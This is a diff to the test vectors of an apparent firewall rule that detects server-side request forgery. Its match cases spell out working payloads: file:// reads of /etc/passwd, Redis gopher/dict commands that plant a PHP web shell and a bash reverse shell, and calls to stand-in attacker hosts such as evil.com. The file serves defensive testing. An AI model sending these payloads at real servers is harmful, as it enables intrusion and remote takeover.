@@ -18,28 +18,51 @@ transformers:
   - lowercase
 test_vectors:
   matches:
-  - server.request.query/param:file:///etc/passwd
-  - server.request.query/param:file://\/\/etc/passwd
-  - server.request.query/param:dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
-  - server.request.query/param:dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
-  - server.request.query/param:dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
-  - server.request.query/param:dict://127.0.0.1:6379/SAVE
-  - server.request.query/param:sftp://evil.com:11111/
-  - server.request.query/param:tftp://evil.com:12346/TESTUDPPACKET
-  - server.request.query/param:ldap://localhost:11211/%0astats%0aquit
-  - server.request.query/param:gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
-  - server.request.query/param:gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
-  - server.request.query/param:gopher://hack3r.site:1337/_SSRF%0ATest!
-  - 'server.request.query/param:gopher://0:25/_%0AHELO victim.com%0AMAIL FROM: <admin@victim.com>%0ARCPT To:
+  - server.request.query:
+      query: file:///etc/passwd
+  - server.request.query:
+      query: file://\/\/etc/passwd
+  - server.request.query:
+      query: dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+  - server.request.query:
+      query: dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+  - server.request.query:
+      query: dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+  - server.request.query:
+      query: dict://127.0.0.1:6379/SAVE
+  - server.request.query:
+      query: sftp://evil.com:11111/
+  - server.request.query:
+      query: tftp://evil.com:12346/TESTUDPPACKET
+  - server.request.query:
+      query: ldap://localhost:11211/%0astats%0aquit
+  - server.request.query:
+      query: gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
+  - server.request.query:
+      query: gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
+  - server.request.query:
+      query: gopher://hack3r.site:1337/_SSRF%0ATest!
+  - server.request.query:
+      query: 'gopher://0:25/_%0AHELO victim.com%0AMAIL FROM: <admin@victim.com>%0ARCPT To:
     <sxcurity@oou.us>'
-  - server.request.query/param:gopher://localhost:8000/_%00%1A%00%00%0A%
-  - server.request.query/param:gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
-  - server.request.query/param:gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
-  - server.request.query/param:gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
-  - server.request.query/param:gopher://127.0.0.1:6379/_save
-  - server.request.query/param:netdoc:///etc/passwd
-  - server.request.query/param:jar:sftp://127.0.0.1:22/
+  - server.request.query:
+      query: gopher://localhost:8000/_%00%1A%00%00%0A%
+  - server.request.query:
+      query: gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
+  - server.request.query:
+      query: gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
+  - server.request.query:
+      query: gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
+  - server.request.query:
+      query: gopher://127.0.0.1:6379/_save
+  - server.request.query:
+      query: netdoc:///etc/passwd
+  - server.request.query:
+      query: jar:sftp://127.0.0.1:22/
   no_matches:
-  - server.request.query/param:http://file.mega.co.nz/
-  - server.request.query/param:https://www.gophercon.com
-  - server.request.query/param:http.ftp.example.com
+  - server.request.query:
+      query: http://file.mega.co.nz/
+  - server.request.query:
+      query: https://www.gophercon.com
+  - server.request.query:
+      query: http.ftp.example.com
